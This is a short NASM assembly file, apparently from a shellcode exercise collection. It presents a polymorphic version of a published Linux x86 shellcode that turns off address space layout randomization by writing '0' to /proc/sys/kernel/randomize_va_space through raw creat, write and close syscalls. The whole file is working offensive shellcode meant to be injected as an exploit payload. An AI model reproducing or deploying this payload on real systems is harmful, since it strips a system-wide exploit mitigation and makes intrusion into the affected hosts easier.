; Filename: offASLR.nasm
; Author:   boku
; Purpose:  Polymorphic version of Jean Pascal Pereiras
;  Linux x86 ASLR deactivation - 83 bytes
; Original: http://shell-storm.org/shellcode/files/shellcode-813.php
global _start
section .text:

_start:

jump:
jmp short creat

syscallInt:
int 0x80
ret

creat:
xor    eax,eax
push   eax
push   0x65636170
push   0x735f6176
push   0x5f657a69
push   0x6d6f646e
push   0x61722f6c
push   0x656e7265
push   0x6b2f7379
push   0x732f636f
push   0x72702f2f
mov    ebx,esp
mov    al,0x8
call syscallInt

mov    ebx,eax
push   0x30
mov    ecx,esp
xor    edx,edx
inc    edx
mov    al,0x4
call syscallInt

mov    al,0x6
call syscallInt
